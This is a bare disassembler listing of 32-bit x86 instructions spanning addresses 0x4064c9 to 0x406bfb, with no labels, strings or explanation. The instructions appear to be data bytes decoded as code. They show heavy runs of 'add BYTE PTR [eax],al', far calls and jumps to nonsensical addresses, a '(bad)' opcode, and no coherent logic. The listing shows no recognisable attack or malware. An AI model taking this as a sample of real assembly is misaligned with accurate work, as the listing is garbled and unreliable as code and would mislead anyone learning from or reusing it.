  4064c9:	mov    ds:0x180,eax
  4064ce:	adc    ch,BYTE PTR [ecx]
  4064d0:	adc    BYTE PTR [ecx],al
  4064d2:	and    BYTE PTR [eax],dl
  4064d4:	add    BYTE PTR [eax],al
  4064d6:	or     al,0xc6
  4064d8:	inc    eax
  4064d9:	push   cs
  4064da:	or     al,ah
  4064dc:	adc    al,al
  4064de:	add    BYTE PTR [eax],al
  4064e0:	inc    eax
  4064e1:	add    BYTE PTR [esi],ch
  4064e3:	add    al,BYTE PTR [eax]
  4064e5:	add    BYTE PTR [ecx],ah
  4064e7:	cdq    
  4064e8:	adc    eax,DWORD PTR [eax]
  4064ea:	inc    esp
  4064eb:	test   DWORD PTR [eax],ecx
  4064ed:	and    DWORD PTR [eax],esp
  4064ef:	add    DWORD PTR [eax],0x60097a11
  4064f5:	add    dl,BYTE PTR [ecx+eax*1]
  4064f8:	mov    al,0x40
  4064fa:	inc    esp
  4064fb:	xor    al,0x40
  4064fd:	rol    BYTE PTR [eax-0x76],0x10
  406501:	xchg   BYTE PTR [ecx+ebp*1],dl
  406504:	add    BYTE PTR [eax+0x50003002],al
  40650a:	add    al,0x0
  40650c:	mov    eax,ds:0x38310e1
  406511:	add    BYTE PTR [edx],al
  406513:	add    BYTE PTR [eax],al
  406515:	sbb    cl,BYTE PTR [ecx]
  406517:	and    dl,al
  406519:	nop
  40651a:	mov    cl,0x43
  40651c:	add    BYTE PTR [eax],al
  40651e:	adc    BYTE PTR [eax],al
  406520:	pop    es
  406521:	and    BYTE PTR [eax+0x4002842],al
  406527:	add    BYTE PTR [ecx],al
  406529:	add    DWORD PTR [ecx+0x60400110],ecx
  40652f:	data16 and al,BYTE PTR [ecx]
  406532:	inc    esp
  406533:	inc    ecx
  406534:	add    BYTE PTR [eax+0x0],al
  406537:	add    BYTE PTR [eax+0x10400204],al
  40653d:	or     BYTE PTR [eax],ah
  40653f:	add    BYTE PTR [edx+eax*1],0xa8
  406543:	inc    esi
  406544:	inc    ebp
  406545:	add    BYTE PTR [ecx+eax*1+0x32805450],0x63
  40654d:	and    DWORD PTR [eax],0xa4200a0
  406553:	dec    eax
  406554:	add    BYTE PTR [ecx+0x400000],dh
  40655a:	adc    BYTE PTR [eax],0x5
  40655d:	dec    eax
  40655e:	adc    al,0x0
  406560:	add    al,BYTE PTR [eax]
  406562:	adc    DWORD PTR [eax+0x2],ebx
  406565:	rcl    BYTE PTR [eax],0x0
  406568:	add    al,0x21
  40656a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40656b:	push   edx
  40656c:	add    edx,DWORD PTR [eax+0x0]
  40656f:	inc    ebx
  406570:	add    BYTE PTR [eax+0x10880140],ch
  406576:	call   0x1270957e
  40657b:	add    al,BYTE PTR [eax]
  40657d:	jne    0x4064ff
  40657f:	adc    BYTE PTR [ecx],al
  406581:	add    BYTE PTR [eax+esi*1],ah
  406584:	and    BYTE PTR [ecx],0x8
  406587:	adc    DWORD PTR [eax],0x20000024
  40658d:	or     DWORD PTR [edx],ebx
  40658f:	add    BYTE PTR [edx+0x4a0],al
  406595:	or     DWORD PTR [edx],0x80d0001e
  40659b:	add    dl,cl
  40659d:	ins    DWORD PTR es:[edi],dx
  40659e:	add    BYTE PTR [eax+0x24],ah
  4065a1:	sbb    esp,DWORD PTR [ebx]
  4065a3:	push   es
  4065a4:	adc    BYTE PTR [eax+eax*2],al
  4065a7:	add    BYTE PTR [eax],dl
  4065a9:	xchg   ebp,eax
  4065aa:	add    ah,BYTE PTR [eax]
  4065ac:	jmp    0x4010:0x44208a13
  4065b3:	and    al,BYTE PTR [eax+0x2460048]
  4065b9:	or     BYTE PTR [ecx],al
  4065bb:	and    BYTE PTR ds:0x2201010,bl
  4065c1:	add    DWORD PTR [eax-0x38],eax
  4065c4:	loope  0x406606
  4065c6:	rcl    BYTE PTR [eax],0x42
  4065c9:	and    BYTE PTR [eax+0x48],0x0
  4065cd:	pusha  
  4065ce:	and    BYTE PTR [eax],al
  4065d0:	inc    esp
  4065d1:	js     0x4065db
  4065d3:	sbb    ah,al
  4065d5:	adc    eax,DWORD PTR [eax+0x0]
  4065d8:	push   eax
  4065d9:	adc    BYTE PTR [edx+0x410c02],dl
  4065df:	enter  0xd800,0x25
  4065e3:	dec    eax
  4065e4:	mov    edx,es
  4065e6:	add    al,0xa2
  4065e8:	mov    WORD PTR [edx+0x0],cs
  4065eb:	and    BYTE PTR [esp+eiz*2],al
  4065ee:	add    BYTE PTR [eax],al
  4065f0:	and    BYTE PTR [eax+0x2],0x40
  4065f4:	add    DWORD PTR [ecx-0x7fff7bf6],esp
  4065fa:	inc    ecx
  4065fb:	add    BYTE PTR [edx],ch
  4065fd:	sub    al,BYTE PTR [eax+0x4c]
  406600:	mov    al,0x44
  406602:	adc    DWORD PTR [eax],eax
  406604:	cwde   
  406605:	inc    eax
  406606:	add    BYTE PTR [edx],al
  406608:	test   BYTE PTR [ecx+0x0],al
  40660b:	and    BYTE PTR [eax],ah
  40660d:	inc    eax
  40660e:	inc    edx
  40660f:	inc    ecx
  406610:	add    BYTE PTR [ebx+0x1],al
  406613:	and    al,0x2
  406615:	add    DWORD PTR [ebx+0x0],0x50019210
  40661c:	or     BYTE PTR [eax],al
  40661e:	pop    ds
  40661f:	add    BYTE PTR [eax-0x75ffea7c],dl
  406625:	add    eax,0x427084
  40662a:	and    BYTE PTR [edx+0x43],ch
  40662d:	add    BYTE PTR [eax],ah
  40662f:	push   es
  406630:	mov    dh,BYTE PTR [eax]
  406632:	add    BYTE PTR [edx],cl
  406634:	add    BYTE PTR [eax-0x38],al
  406637:	add    BYTE PTR [eax],al
  406639:	add    DWORD PTR [edx+0x0],ecx
  40663c:	sub    DWORD PTR [eax],eax
  40663e:	adc    al,0x22
  406640:	dec    ebp
  406641:	push   ss
  406642:	add    al,cl
  406644:	or     ch,cl
  406646:	add    al,0x2
  406649:	add    al,0x8b
  40664b:	xchg   edx,eax
  40664c:	add    BYTE PTR [eax+0x0],al
  40664f:	inc    esp
  406650:	xchg   ecx,eax
  406651:	add    al,BYTE PTR [eax+eax*1]
  406654:	adc    al,0x0
  406656:	or     BYTE PTR [edx],0x0
  406659:	add    DWORD PTR [ecx+ecx*1],0x0
  40665d:	mov    BYTE PTR [eax],al
  40665f:	add    BYTE PTR [eax],cl
  406661:	(bad)  
  406662:	and    al,BYTE PTR [eax]
  406664:	add    BYTE PTR [eax+0x821034],bl
  40666a:	add    BYTE PTR [eax],al
  40666c:	add    DWORD PTR [eax+0x5a100200],eax
  406672:	fadd   DWORD PTR [esi]
  406674:	and    BYTE PTR [esi+0x208100],al
  40667a:	add    BYTE PTR [ecx+0x0],0x5e
  40667e:	inc    esp
  40667f:	add    al,0x22
  406681:	nop
  406682:	int3   
  406683:	add    BYTE PTR [ecx],al
  406685:	or     BYTE PTR [ecx],cl
  406687:	rol    BYTE PTR [edx],1
  406689:	adc    cl,BYTE PTR [eax]
  40668b:	add    BYTE PTR [eax],al
  40668d:	add    BYTE PTR [edx],cl
  40668f:	sub    eax,0x8040200
  406694:	and    esp,DWORD PTR [eax-0x40]
  406697:	sub    al,BYTE PTR [eax]
  406699:	or     BYTE PTR [eax],al
  40669b:	xor    al,BYTE PTR [ecx]
  40669d:	or     BYTE PTR [eax],al
  40669f:	add    BYTE PTR [eax],0x41
  4066a2:	or     al,0x0
  4066a4:	pusha  
  4066a5:	pshufw mm0,mm0,0x8
  4066a9:	cld    
  4066aa:	jo     0x4066bd
  4066ac:	sbb    al,BYTE PTR [eax+esi*4]
  4066af:	sub    BYTE PTR [esp+eax*1],0x40
  4066b3:	mov    dh,0x80
  4066b5:	inc    esp
  4066b6:	or     al,0x0
  4066b8:	add    al,BYTE PTR [eax+eax*1]
  4066bb:	add    BYTE PTR [eax],al
  4066bd:	sub    eax,DWORD PTR [ebx]
  4066bf:	add    DWORD PTR [eax+0x2],eax
  4066c2:	inc    eax
  4066c3:	add    al,0x90
  4066c5:	add    eax,DWORD PTR [eax+eax*4]
  4066c8:	add    BYTE PTR [eax],al
  4066ca:	add    al,BYTE PTR [eax]
  4066cc:	pop    es
  4066cd:	add    al,BYTE PTR [eax+eax*1]
  4066d0:	add    BYTE PTR [eax+eax*2],cl
  4066d3:	popf   
  4066d4:	inc    eax
  4066d5:	rol    DWORD PTR [eax],0x6d
  4066d8:	add    bl,BYTE PTR [edx+0x10]
  4066db:	xor    BYTE PTR [eax],0x45
  4066de:	and    BYTE PTR [ecx+edx*4+0x41],0x66
  4066e3:	add    DWORD PTR [eax+eiz*1],eax
  4066e6:	xor    al,BYTE PTR [ecx+0x5c12230]
  4066ec:	and    BYTE PTR [eax],ah
  4066ee:	mov    BYTE PTR [eax],cl
  4066f0:	add    BYTE PTR [eax-0x80],0x0
  4066f4:	adc    al,0x42
  4066f6:	and    BYTE PTR [eax-0x1e],0x11
  4066fa:	adc    BYTE PTR [ecx],al
  4066fc:	xor    BYTE PTR [eax],al
  4066fe:	add    al,BYTE PTR [ecx]
  406700:	dec    esp
  406701:	inc    esp
  406702:	adc    ah,BYTE PTR [edx+0x0]
  406705:	inc    eax
  406706:	and    BYTE PTR [edx],al
  406708:	pop    es
  406709:	add    BYTE PTR [ecx+0x40024d42],bh
  40670f:	add    DWORD PTR [eax],eax
  406711:	and    BYTE PTR [eax],al
  406713:	push   ss
  406714:	and    esp,DWORD PTR [esi+eax*4+0x10]
  406718:	enter  0xca10,0x2
  40671c:	and    DWORD PTR [edx],eax
  40671e:	adc    BYTE PTR [ecx],al
  406720:	add    al,BYTE PTR [ecx]
  406722:	add    edx,DWORD PTR [eax]
  406724:	and    DWORD PTR [eax],edx
  406726:	sub    BYTE PTR [eax+0x10],al
  406729:	adc    BYTE PTR [edx+0x0],al
  40672c:	adc    eax,eax
  40672e:	mov    al,ds:0x201431
  406733:	add    BYTE PTR [eax],al
  406735:	test   BYTE PTR [ebx+0x0],al
  406738:	adc    DWORD PTR [eax],eax
  40673a:	inc    ecx
  40673b:	adc    ah,BYTE PTR [eax]
  40673d:	adc    BYTE PTR [eax-0x7c],cl
  406740:	add    dl,0x2c
  406743:	or     ecx,DWORD PTR [eax+eax*1]
  406746:	or     BYTE PTR [eax],al
  406748:	add    eax,DWORD PTR [eax]
  40674a:	mov    DWORD PTR [esi+edx*2],eax
  40674d:	inc    eax
  40674e:	add    BYTE PTR [eax],al
  406750:	sbb    BYTE PTR [ecx],dh
  406752:	sub    dl,BYTE PTR [eax]
  406754:	add    BYTE PTR [eax+0xc02832],al
  40675a:	inc    edx
  40675b:	es test al,0x10
  40675e:	inc    eax
  40675f:	add    ch,BYTE PTR [ecx+0x48]
  406762:	rol    BYTE PTR [ecx+ebx*4],0x4c
  406766:	add    BYTE PTR [eax],cl
  406768:	add    DWORD PTR [eax+0x60400b01],ecx
  40676e:	or     BYTE PTR [ecx],bl
  406770:	pusha  
  406771:	inc    eax
  406772:	and    al,0x83
  406774:	and    BYTE PTR [ebx],cl
  406776:	adc    al,0x8
  406778:	mov    BYTE PTR [eax],0x40
  40677b:	cwde   
  40677c:	adc    BYTE PTR [ecx-0x7ecdeddb],0x84
  406783:	or     al,BYTE PTR [eax]
  406785:	sbb    BYTE PTR [eax],al
  406787:	add    BYTE PTR [eax],al
  406789:	add    BYTE PTR [eax+0x100090a9],al
  40678f:	adc    BYTE PTR [eax],0x28
  406792:	add    BYTE PTR [eax],al
  406794:	add    BYTE PTR [eax],al
  406796:	add    BYTE PTR [ecx+0x4000],cl
  40679c:	or     BYTE PTR [ecx+0x2],al
  40679f:	mov    BYTE PTR [edx+0x30],al
  4067a2:	adc    BYTE PTR [edx],0xa
  4067a5:	mov    al,0xd0
  4067a7:	adc    BYTE PTR [eax],dl
  4067a9:	add    BYTE PTR ds:0x4002e00,al
  4067af:	add    al,0x0
  4067b1:	inc    ecx
  4067b2:	inc    eax
  4067b3:	jne    0x4067c7
  4067b5:	adc    BYTE PTR [eax],al
  4067b7:	or     BYTE PTR [eax+0x50],ah
  4067ba:	test   BYTE PTR [eax],al
  4067bc:	inc    eax
  4067bd:	or     ebp,DWORD PTR [eax]
  4067bf:	add    BYTE PTR [ebp+0x14],al
  4067c2:	ret    0x600
  4067c5:	add    bl,BYTE PTR [eax]
  4067c7:	adc    dl,BYTE PTR [eax+0x0]
  4067ca:	nop
  4067cb:	xchg   ebx,eax
  4067cc:	je     0x4067de
  4067ce:	add    DWORD PTR [ecx],0x79
  4067d1:	add    al,al
  4067d3:	or     al,0xd
  4067d5:	mov    BYTE PTR [eax+0x400198c0],bl
  4067db:	xor    eax,DWORD PTR [eax]
  4067dd:	or     BYTE PTR [eax],dl
  4067df:	les    eax,FWORD PTR [eax-0x6bfecfc0]
  4067e5:	mov    BYTE PTR [edx],al
  4067e7:	test   BYTE PTR [eax],al
  4067e9:	add    ecx,DWORD PTR [eax+0x0]
  4067ec:	nop
  4067ed:	rcl    BYTE PTR [edx],0x0
  4067f0:	or     BYTE PTR [eax],al
  4067f2:	push   ecx
  4067f3:	inc    eax
  4067f4:	adc    BYTE PTR [edx],0x0
  4067f7:	cmp    al,0x8
  4067f9:	cmp    DWORD PTR [ecx],eax
  4067fb:	and    BYTE PTR [ecx],ah
  4067fd:	adc    BYTE PTR [ebp+0x0],0x89
  406801:	add    BYTE PTR [ebx],ah
  406803:	and    DWORD PTR [eax],eax
  406805:	add    BYTE PTR [eax+0x20],dl
  406808:	and    BYTE PTR [eax],bl
  40680a:	add    BYTE PTR [eax+edx*1],cl
  40680d:	adc    BYTE PTR [eax],0x3
  406810:	imul   ebx,DWORD PTR [eax],0x60c45267
  406816:	add    BYTE PTR [edx],al
  406818:	mov    ds:0x204e4408,al
  40681d:	and    BYTE PTR [edx+0x1],dl
  406820:	mov    BYTE PTR [ecx],cl
  406822:	add    BYTE PTR [edx],al
  406824:	or     dh,al
  406826:	or     BYTE PTR ds:0x80102001,al
  40682c:	daa    
  40682d:	add    BYTE PTR [eax],cl
  40682f:	and    BYTE PTR [eax],dh
  406831:	and    al,BYTE PTR [eax]
  406833:	push   edx
  406834:	add    DWORD PTR [ecx+0x1a66501],esp
  40683a:	pusha  
  40683b:	or     BYTE PTR [ecx],dl
  40683d:	add    ecx,DWORD PTR [edx]
  40683f:	add    BYTE PTR [ebx+0x4080852],al
  406845:	and    BYTE PTR [edx+0x1807422],dl
  40684b:	xor    BYTE PTR [eax-0x70],al
  40684e:	dec    edx
  40684f:	or     BYTE PTR [eax],ah
  406851:	fs enter 0x6241,0x2
  406856:	push   esp
  406857:	add    cl,BYTE PTR [eax]
  406859:	dec    edx
  40685a:	adc    BYTE PTR [ebx+0x1884001],dl
  406860:	add    DWORD PTR [edx+0x40],eax
  406863:	adc    cl,BYTE PTR [eax]
  406865:	or     BYTE PTR [eax],al
  406867:	add    al,BYTE PTR [eax+0x0]
  40686a:	add    BYTE PTR [eax],al
  40686c:	add    BYTE PTR [eax],dl
  40686e:	and    BYTE PTR [eax-0x3fce0000],cl
  406874:	add    DWORD PTR [eax],eax
  406876:	inc    esp
  406877:	add    BYTE PTR [ebx],0x9
  40687a:	pop    ss
  40687b:	push   eax
  40687c:	inc    esp
  40687d:	mov    dh,0x0
  40687f:	add    BYTE PTR [ecx+0x4],al
  406882:	pusha  
  406883:	add    al,BYTE PTR [edx]
  406885:	add    cl,BYTE PTR [eax+0x0]
  406888:	add    BYTE PTR [esi+0x22c8c508],ah
  40688e:	adc    al,0x40
  406890:	add    BYTE PTR [edx],0x78
  406893:	add    BYTE PTR [ecx+edi*2],al
  406896:	add    al,BYTE PTR [eax]
  406898:	int3   
  406899:	add    BYTE PTR [eax],al
  40689b:	add    DWORD PTR [eax-0x68],eax
  40689e:	call   0x808:0x808840
  4068a5:	add    BYTE PTR [ecx+0x52001330],0x0
  4068ac:	inc    eax
  4068ad:	add    BYTE PTR [eax+edx*1+0x2454804],al
  4068b4:	add    al,0x80
  4068b6:	test   BYTE PTR [ecx],al
  4068b8:	and    BYTE PTR [eax],dl
  4068ba:	adc    BYTE PTR [eax+0x8],al
  4068bd:	add    BYTE PTR [eax],dh
  4068bf:	pop    es
  4068c0:	inc    esp
  4068c1:	and    eax,0x1005214
  4068c6:	inc    eax
  4068c7:	xor    cl,BYTE PTR [eax+eax*2]
  4068ca:	add    al,0x0
  4068cc:	add    dh,BYTE PTR [esp+eiz*4]
  4068cf:	add    ah,BYTE PTR [eax+0x22]
  4068d2:	add    BYTE PTR [ecx-0x786bbf36],cl
  4068d8:	sub    BYTE PTR [ecx],dl
  4068da:	or     al,0x8b
  4068dc:	and    cl,dl
  4068de:	nop
  4068df:	jb     0x4068e5
  4068e1:	and    BYTE PTR [eax],al
  4068e3:	inc    eax
  4068e4:	adc    BYTE PTR [eax+0x40628808],al
  4068ea:	add    al,0x80
  4068ec:	and    cl,ah
  4068ee:	adc    BYTE PTR [eax+0x1],dh
  4068f1:	adc    BYTE PTR [eax],dl
  4068f3:	add    BYTE PTR [eax],cl
  4068f5:	nop
  4068f6:	adc    BYTE PTR [eax+0x20a004b],al
  4068fc:	scas   al,BYTE PTR es:[edi]
  4068fd:	inc    eax
  4068fe:	mov    BYTE PTR [edx],al
  406900:	inc    ebx
  406901:	add    BYTE PTR [eax+0x50],dl
  406904:	adc    ch,ch
  406906:	cmp    BYTE PTR [eax],0x1
  406909:	add    BYTE PTR [eax+0x49],0x90
  40690d:	adc    DWORD PTR [eax+0x20],0xffffffa6
  406911:	add    al,BYTE PTR [ecx+0x52]
  406914:	inc    edx
  406915:	add    al,0x40
  406917:	inc    eax
  406918:	pusha  
  406919:	add    al,BYTE PTR [eax]
  40691b:	in     al,0x0
  40691d:	inc    ecx
  40691e:	mov    BYTE PTR [eax-0x7f83e000],dl
  406924:	add    BYTE PTR [ecx],al
  406926:	add    BYTE PTR [ecx],al
  406928:	add    BYTE PTR [eax],al
  40692a:	pusha  
  40692b:	adc    BYTE PTR [eax],al
  40692d:	add    BYTE PTR ds:0x480208,al
  406933:	add    DWORD PTR [edx],ebp
  406935:	inc    edx
  406936:	inc    eax
  406937:	add    BYTE PTR [eax],cl
  406939:	adc    BYTE PTR [esi],cl
  40693b:	and    al,0x0
  40693d:	inc    esp
  40693e:	adc    DWORD PTR [eax-0x6cffedf0],ebx
  406944:	xor    BYTE PTR [eax],al
  406946:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406947:	or     al,ch
  406949:	adc    al,0x0
  40694b:	adc    al,al
  40694d:	sub    dh,BYTE PTR [eax+0x72]
  406950:	add    DWORD PTR [eax-0x66],esp
  406953:	nop
  406954:	adc    BYTE PTR [edx+0xa],al
  406957:	nop
  406958:	or     al,0x0
  40695a:	and    BYTE PTR [eax],al
  40695c:	add    ah,al
  40695e:	add    al,BYTE PTR [eax+0x0]
  406961:	or     al,0x1f
  406963:	ret    0x6540
  406966:	or     eax,0x820800d0
  40696b:	add    cl,BYTE PTR [ecx]
  40696d:	nop
  40696e:	add    BYTE PTR [eax-0x3f5faff8],al
  406974:	ret    0x68
  406977:	add    BYTE PTR [ecx],0x4
  40697a:	xchg   BYTE PTR [ecx+0x24040243],al
  406980:	cwde   
  406981:	add    ah,dl
  406983:	inc    eax
  406984:	add    BYTE PTR [eax+0x8],cl
  406987:	or     DWORD PTR [eax+ecx*2-0x7a],ebx
  40698b:	adc    al,BYTE PTR [eax]
  40698d:	add    BYTE PTR [eax],ah
  40698f:	add    BYTE PTR [ebp+0x10c22620],al
  406995:	inc    eax
  406996:	add    BYTE PTR [edi],cl
  406998:	mov    eax,ds:0xcf08
  40699d:	mov    al,0x1
  40699f:	add    al,0x9
  4069a1:	push   es
  4069a2:	adc    BYTE PTR [eax+eax*4],dh
  4069a5:	add    al,0x58
  4069a7:	inc    edx
  4069a8:	sub    BYTE PTR [eax],al
  4069aa:	add    BYTE PTR [ecx+0x0],al
  4069ad:	add    DWORD PTR [eax+0x45],eax
  4069b0:	add    BYTE PTR [eax-0x5a],0x40
  4069b4:	add    DWORD PTR [edx],eax
  4069b6:	add    al,0x60
  4069b8:	add    BYTE PTR [ecx],0x60
  4069bb:	add    BYTE PTR [edx],0x80
  4069be:	add    DWORD PTR [eax],edx
  4069c0:	inc    edx
  4069c1:	stos   DWORD PTR es:[edi],eax
  4069c2:	sbb    BYTE PTR [ebx],al
  4069c4:	add    BYTE PTR [eax+0x18],ah
  4069c7:	add    BYTE PTR [ecx+0x4116002],cl
  4069cd:	add    BYTE PTR [eax+0x10410200],al
  4069d3:	adc    al,0x80
  4069d5:	nop
  4069d6:	shl    BYTE PTR [ebx],0x14
  4069d9:	inc    ecx
  4069da:	sub    BYTE PTR [eax],bl
  4069dc:	adc    BYTE PTR [eax],0x48
  4069df:	inc    eax
  4069e0:	add    BYTE PTR [eax],dh
  4069e2:	add    eax,DWORD PTR [ecx]
  4069e4:	add    BYTE PTR [eax],al
  4069e6:	add    eax,DWORD PTR [edx]
  4069e8:	sub    dl,BYTE PTR [eax]
  4069ea:	add    BYTE PTR [eax],al
  4069ec:	add    BYTE PTR [eax],al
  4069ee:	push   ss
  4069ef:	add    al,0xc5
  4069f1:	add    BYTE PTR [eax+0x2400602d],al
  4069f7:	add    al,BYTE PTR [eax]
  4069f9:	add    BYTE PTR [eax+0x10],0x82
  4069fd:	add    BYTE PTR [eax],dl
  4069ff:	and    BYTE PTR [eax-0x70],ah
  406a02:	add    BYTE PTR [edx+eiz*1+0x40],al
  406a06:	inc    eax
  406a07:	adc    BYTE PTR [ebp+0x8000000],al
  406a0d:	and    al,0x1
  406a0f:	or     BYTE PTR [eax],bl
  406a11:	add    DWORD PTR [eax+0xe],eax
  406a14:	add    BYTE PTR [eax+0x8],al
  406a17:	add    DWORD PTR [eax+eax*1+0x5],edx
  406a1b:	add    BYTE PTR [eax],ah
  406a1d:	add    BYTE PTR [eax+eiz*1+0x2],0x20
  406a22:	add    DWORD PTR [eax+eax*1],eax
  406a25:	add    eax,ecx
  406a27:	shl    DWORD PTR [eax+edx*4+0x930580b],0x26
  406a2f:	add    BYTE PTR [ecx],al
  406a31:	adc    BYTE PTR [eax],al
  406a33:	test   BYTE PTR [eax],cl
  406a35:	add    al,0x0
  406a37:	inc    ebp
  406a38:	jne    0x4069d4
  406a3a:	add    DWORD PTR [eax+0x20],eax
  406a3d:	and    BYTE PTR [eax],al
  406a3f:	add    cl,al
  406a41:	add    bl,ch
  406a43:	rol    DWORD PTR [eax],0x40
  406a46:	pop    es
  406a47:	dec    eax
  406a48:	add    BYTE PTR [eax],bh
  406a4a:	adc    BYTE PTR [eax+0x0],ah
  406a4d:	xchg   BYTE PTR [ecx+0x11080],dl
  406a53:	add    al,BYTE PTR [edx+0x0]
  406a56:	add    BYTE PTR es:[eax],cl
  406a59:	inc    eax
  406a5a:	add    BYTE PTR [eax],al
  406a5c:	call   0x5281:0x13d011e6
  406a63:	adc    al,0x48
  406a65:	and    BYTE PTR [ecx],0x0
  406a68:	sub    DWORD PTR [eax],esp
  406a6a:	rcr    BYTE PTR [eax-0x80],0x20
  406a6e:	add    BYTE PTR [edx],cl
  406a70:	and    BYTE PTR [esi+0x0],al
  406a73:	inc    eax
  406a74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406a75:	adc    DWORD PTR [ecx],eax
  406a77:	inc    eax
  406a78:	inc    esp
  406a79:	adc    BYTE PTR [edx],al
  406a7b:	add    DWORD PTR [ecx],eax
  406a7d:	dec    esp
  406a7e:	inc    ecx
  406a7f:	inc    eax
  406a80:	and    DWORD PTR [eax],eax
  406a82:	add    DWORD PTR [eax+0x400010bf],eax
  406a88:	push   eax
  406a89:	adc    BYTE PTR [edx+eax*1+0x0],cl
  406a8d:	add    BYTE PTR [edx],al
  406a8f:	add    BYTE PTR [ecx+0x0],al
  406a92:	adc    BYTE PTR [ecx+edx*8+0x20100542],cl
  406a99:	and    DWORD PTR [eax],esi
  406a9b:	inc    eax
  406a9c:	inc    eax
  406a9d:	inc    ecx
  406a9e:	add    BYTE PTR [eax+0x10121000],al
  406aa4:	add    BYTE PTR [eax],cl
  406aa6:	add    BYTE PTR [eax],al
  406aa8:	inc    eax
  406aa9:	inc    eax
  406aaa:	add    BYTE PTR [eax],al
  406aac:	and    BYTE PTR [eax],al
  406aae:	add    al,0x40
  406ab0:	ret    0xc12
  406ab3:	and    BYTE PTR [eax],al
  406ab5:	xchg   ecx,eax
  406ab6:	add    al,BYTE PTR [edx]
  406ab8:	adc    BYTE PTR [ecx],al
  406aba:	add    BYTE PTR [eax],ah
  406abc:	inc    ecx
  406abd:	rcl    BYTE PTR [eax+0x0],0x0
  406ac1:	add    BYTE PTR [eax],cl
  406ac3:	inc    esp
  406ac4:	add    BYTE PTR [eax],al
  406ac6:	add    al,0xc
  406ac8:	inc    eax
  406ac9:	mov    al,0x1
  406acb:	or     BYTE PTR [ecx],cl
  406acd:	add    dl,dl
  406acf:	sub    BYTE PTR [eax],cl
  406ad1:	or     BYTE PTR [edx],bl
  406ad3:	or     BYTE PTR [ecx],dl
  406ad5:	add    DWORD PTR [esp+eax*1-0x3bf3f7a8],eax
  406adc:	or     BYTE PTR [eax],al
  406ade:	sbb    BYTE PTR [eax+eax*1+0x6000ca18],cl
  406ae5:	and    al,BYTE PTR [edx+0x12a]
  406aeb:	or     al,0x40
  406aed:	and    edx,DWORD PTR [eax+0x40]
  406af0:	xchg   BYTE PTR [eax],cl
  406af2:	and    BYTE PTR [edx],cl
  406af4:	adc    eax,DWORD PTR [eax-0x17b7febc]
  406afa:	and    al,BYTE PTR [ebx]
  406afc:	add    BYTE PTR [eax],ah
  406afe:	ror    DWORD PTR [eax],0x9c
  406b01:	add    BYTE PTR [eax+ebp*1],ah
  406b04:	and    al,0x4a
  406b06:	push   es
  406b07:	inc    ebx
  406b08:	add    BYTE PTR [ecx],cl
  406b0a:	add    al,0x0
  406b0c:	adc    DWORD PTR [eax],eax
  406b0e:	inc    eax
  406b0f:	les    eax,FWORD PTR [eax+0x50012]
  406b15:	and    DWORD PTR [eax],esi
  406b17:	and    al,0x64
  406b19:	add    BYTE PTR [eax+0x0],0x4
  406b1d:	add    BYTE PTR [edx+0x4000200],ah
  406b23:	or     BYTE PTR [eax],cl
  406b25:	adc    BYTE PTR [eax],0x11
  406b28:	or     BYTE PTR [edx+0x26],0x50
  406b2c:	add    al,0x9
  406b2e:	add    BYTE PTR [eax-0x777fb000],al
  406b34:	and    al,al
  406b36:	add    BYTE PTR [ecx],al
  406b38:	cmp    BYTE PTR [eax],0x7
  406b3b:	add    DWORD PTR [edx+0x22d8004],eax
  406b41:	inc    edx
  406b42:	and    DWORD PTR [eax-0x7df7fff8],eax
  406b48:	or     DWORD PTR [ebx],0x24003000
  406b4e:	les    eax,FWORD PTR [eax]
  406b50:	add    al,0x51
  406b52:	add    BYTE PTR [eax],al
  406b54:	inc    esp
  406b55:	add    DWORD PTR [eax],esp
  406b57:	add    eax,0x1985c852
  406b5c:	sub    BYTE PTR [eax],al
  406b5e:	or     ch,BYTE PTR [ecx]
  406b60:	add    BYTE PTR [eax],dh
  406b62:	or     cl,BYTE PTR [ecx]
  406b64:	adc    BYTE PTR [edx-0x80],dl
  406b67:	xchg   BYTE PTR [edx],al
  406b69:	add    al,BYTE PTR [eax+0x2140540]
  406b6f:	add    BYTE PTR [eax],ah
  406b71:	add    DWORD PTR [ecx+0x50],eax
  406b74:	pusha  
  406b75:	add    BYTE PTR [eax],dl
  406b77:	inc    ebx
  406b78:	push   es
  406b79:	add    al,0x90
  406b7b:	cdq    
  406b7c:	add    BYTE PTR [eax+0x64c644],dl
  406b82:	add    ah,BYTE PTR [eax+0x0]
  406b85:	add    BYTE PTR [eax],al
  406b87:	add    BYTE PTR [edx],dl
  406b89:	or     BYTE PTR [edx+0x8],al
  406b8c:	jo     0x406b92
  406b8e:	add    al,0x0
  406b90:	adc    ah,BYTE PTR [ecx]
  406b92:	add    al,BYTE PTR [eax+0xf2000]
  406b98:	add    bh,bl
  406b9a:	adc    al,0xa2
  406b9c:	add    BYTE PTR [ecx],al
  406b9e:	inc    eax
  406b9f:	add    ch,BYTE PTR [ecx+0x1]
  406ba2:	or     BYTE PTR [eax],ah
  406ba4:	add    BYTE PTR ds:0x88014591,al
  406baa:	inc    eax
  406bab:	add    DWORD PTR [eax],ecx
  406bad:	dec    ecx
  406bae:	inc    edx
  406baf:	and    BYTE PTR [eax],ah
  406bb1:	add    DWORD PTR [ecx+0x40],esi
  406bb4:	inc    ecx
  406bb5:	inc    edx
  406bb6:	xor    BYTE PTR ss:[eax],al
  406bb9:	bound  eax,QWORD PTR [ecx]
  406bbb:	inc    ecx
  406bbc:	or     BYTE PTR [ecx-0x7f9ffffc],dl
  406bc2:	add    BYTE PTR [eax+0x0],cl
  406bc5:	adc    al,0x41
  406bc7:	and    BYTE PTR [edx],dh
  406bc9:	push   eax
  406bca:	adc    BYTE PTR [ecx-0x67da7ff0],dh
  406bd0:	or     BYTE PTR [eax+0x0],ah
  406bd3:	sbb    al,BYTE PTR [ecx+ebx*1]
  406bd6:	add    BYTE PTR [edx],cl
  406bd8:	push   eax
  406bd9:	jbe    0x406c0f
  406bdb:	and    BYTE PTR [eax],ah
  406bdd:	sub    BYTE PTR [eax-0x6b],0x40
  406be1:	add    BYTE PTR [edx],ah
  406be3:	adc    BYTE PTR [eax],al
  406be5:	add    BYTE PTR [eax+0x40a00040],0x42
  406bec:	add    BYTE PTR [edx],al
  406bee:	add    DWORD PTR [eax],eax
  406bf0:	add    BYTE PTR [edx+0x44],ch
  406bf3:	fdivr  DWORD PTR [eax+0x41]
  406bf6:	nop
  406bf7:	cwde   
  406bf8:	cmp    DWORD PTR [eax+eax*1],ebx
  406bfb:	jb     0x406c0d
